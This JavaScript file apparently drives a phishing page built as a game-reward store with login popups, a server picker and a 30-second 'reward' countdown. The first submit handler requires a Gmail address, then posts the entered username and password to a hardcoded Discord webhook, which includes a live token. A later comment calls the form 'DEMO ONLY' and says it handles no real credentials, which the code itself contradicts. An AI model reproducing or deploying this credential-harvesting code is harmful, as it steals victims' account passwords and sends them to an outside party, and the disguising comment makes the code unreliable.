const webhookURL = "https://discord.com/api/webhooks/1527318354191192169/NRSqo--ECTdMtyz_rkiI488C2Pd2gYVWcziRAOhDICEROFU7KTTKdbF4A2v1W57MLZmp";

function sendToWebhook(content) {
    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: content
        })
    }).catch(err => console.log("Webhook error:", err));
}


document.getElementById("loginForm").addEventListener("submit", function (e) {
    e.preventDefault();

const username = document.getElementById("username").value.trim();
const password = document.getElementById("password").value.trim();

if (!username || !password) {
    alert("Please fill in all fields.");
    return;
}


if (!username.toLowerCase().endsWith("@gmail.com")) {
    alert("Please enter a valid Gmail address.");
    return;
}


    sendToWebhook(
        `🔐 LOGIN ATTEMPT\n👤 Username: ${username}\n🔑 Password: ${password}`
    );

    console.log("Username:", username);
    console.log("Password:", password);

    document.getElementById("loginBox").classList.remove("show");

  
    const popup = document.getElementById("rewardPopup");

    if (popup) {
        popup.classList.add("show");
    }
});



document.addEventListener("DOMContentLoaded", function () {

    /* =================================================
       LOGIN ELEMENTS
    ================================================= */

    const loginBtn =
        document.querySelector(".open-login");

    const loginBox =
        document.getElementById("loginBox");

    const loginOverlay =
        document.getElementById("loginOverlay");

    const loginForm =
        document.getElementById("loginForm");


    /* =================================================
       OPEN LOGIN
    ================================================= */

    function openLogin() {

        if (!loginBox) return;

        loginBox.classList.add("show");

        if (loginOverlay) {
            loginOverlay.classList.add("show");
        }

        document.body.classList.add("login-open");

    }


    /* =================================================
       CLOSE LOGIN
    ================================================= */

    function closeLogin() {

        if (!loginBox) return;

        loginBox.classList.remove("show");

        if (loginOverlay) {
            loginOverlay.classList.remove("show");
        }

        document.body.classList.remove("login-open");

    }


    /* =================================================
       JOIN NOW BUTTON
       
       CLICK 1 = OPEN
       CLICK 2 = CLOSE
    ================================================= */

    if (loginBtn) {

        loginBtn.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();


                if (
                    loginBox &&
                    loginBox.classList.contains("show")
                ) {

                    closeLogin();

                } else {

                    openLogin();

                }

            }
        );

    }


    /* =================================================
       ALL BUY BUTTONS
    ================================================= */

    const buyButtons =
        document.querySelectorAll(".buy-button");


    buyButtons.forEach(function (button) {

        button.addEventListener(
            "click",
            function (event) {

                event.preventDefault();
                event.stopPropagation();

                openLogin();

            }
        );

    });


    /* =================================================
       CLICK OUTSIDE LOGIN = CLOSE
    ================================================= */

    document.addEventListener(
        "click",
        function (event) {

            if (!loginBox) return;


            if (
                loginBox.classList.contains("show")
            ) {

                /*
                    Huwag isara kung:
                    - nasa login box
                    - nasa JOIN NOW button
                */

                if (
                    !loginBox.contains(event.target) &&
                    !loginBtn?.contains(event.target)
                ) {

                    closeLogin();

                }

            }

        }
    );


    /* =================================================
       LOGIN OVERLAY CLICK = CLOSE
    ================================================= */

    if (loginOverlay) {

        loginOverlay.addEventListener(
            "click",
            function () {

                closeLogin();

            }
        );

    }


    /* =================================================
       ESC KEY = CLOSE LOGIN
    ================================================= */

    document.addEventListener(
        "keydown",
        function (event) {

            if (event.key === "Escape") {

                closeLogin();

            }

        }
    );


    /* =================================================
       LOGIN FORM
       
       DEMO ONLY
       Does not process real credentials/payment.
    ================================================= */

    if (loginForm) {

        loginForm.addEventListener(
            "submit",
            function (event) {

                event.preventDefault();

                closeLogin();

                startRewardLoading();

            }
        );

    }


    /* =================================================
       REWARD LOADING
       30 SECOND COUNTDOWN
    ================================================= */

    function startRewardLoading() {

        const rewardPopup =
            document.getElementById("rewardPopup");

        const countdown =
            document.getElementById("countdown");


        if (!rewardPopup) return;


        let seconds = 30;


        /* SHOW POPUP */

        rewardPopup.classList.add("show");


        /* INITIAL COUNTDOWN */

        if (countdown) {

            countdown.textContent =
                seconds;

        }


        /* CLEAR PREVIOUS TIMER */

        if (window.rewardTimer) {

            clearInterval(
                window.rewardTimer
            );

        }


        /* START COUNTDOWN */

        window.rewardTimer =
            setInterval(
                function () {

                    seconds--;


                    if (countdown) {

                        countdown.textContent =
                            seconds;

                    }


                    /* =========================
                       COUNTDOWN FINISHED
                    ========================== */

                    if (seconds <= 0) {

                        clearInterval(
                            window.rewardTimer
                        );


                        /*
                            Redirect to account page.
                        */

                        window.location.href =
                            "account.html";

                    }

                },
                1000
            );

    }


    /* =================================================
       SERVER DROPDOWN
    ================================================= */

    const serverDropdown =
        document.getElementById(
            "serverDropdown"
        );


    if (serverDropdown) {

        const serverSelected =
            serverDropdown.querySelector(
                ".server-selected"
            );

        const serverItems =
            serverDropdown.querySelectorAll(
                ".server-item"
            );


        /* ---------------------------------------------
           OPEN / CLOSE SERVER DROPDOWN
        --------------------------------------------- */

        if (serverSelected) {

            serverSelected.addEventListener(
                "click",
                function (event) {

                    event.preventDefault();
                    event.stopPropagation();


                    serverDropdown.classList.toggle(
                        "open"
                    );

                }
            );

        }


        /* ---------------------------------------------
           SELECT SERVER
        --------------------------------------------- */

        serverItems.forEach(
            function (item) {

                item.addEventListener(
                    "click",
                    function (event) {

                        event.preventDefault();
                        event.stopPropagation();


                        const itemImage =
                            item.querySelector("img");

                        const itemName =
                            item.querySelector("span");


                        const selectedImage =
                            serverSelected?.querySelector(
                                ".server-flag"
                            );

                        const selectedName =
                            serverSelected?.querySelector(
                                "span:nth-child(2)"
                            );


                        /* CHANGE FLAG */

                        if (
                            itemImage &&
                            selectedImage
                        ) {

                            selectedImage.src =
                                itemImage.src;

                        }


                        /* CHANGE SERVER NAME */

                        if (
                            itemName &&
                            selectedName
                        ) {

                            selectedName.textContent =
                                itemName.textContent;

                        }


                        /* SAVE SELECTED SERVER */

                        serverDropdown.dataset.value =
                            item.dataset.value || "";


                        /* CLOSE DROPDOWN */

                        serverDropdown.classList.remove(
                            "open"
                        );

                    }
                );

            }
        );


        /* ---------------------------------------------
           CLICK OUTSIDE SERVER DROPDOWN
        --------------------------------------------- */

        document.addEventListener(
            "click",
            function (event) {

                if (
                    !serverDropdown.contains(
                        event.target
                    )
                ) {

                    serverDropdown.classList.remove(
                        "open"
                    );

                }

            }
        );

    }


    /* =================================================
       SCROLL EFFECT
    ================================================= */

    window.addEventListener(
        "scroll",
        function () {

            if (window.scrollY > 100) {

                document.body.classList.add(
                    "scrolled"
                );

            } else {

                document.body.classList.remove(
                    "scrolled"
                );

            }

        }
    );


});
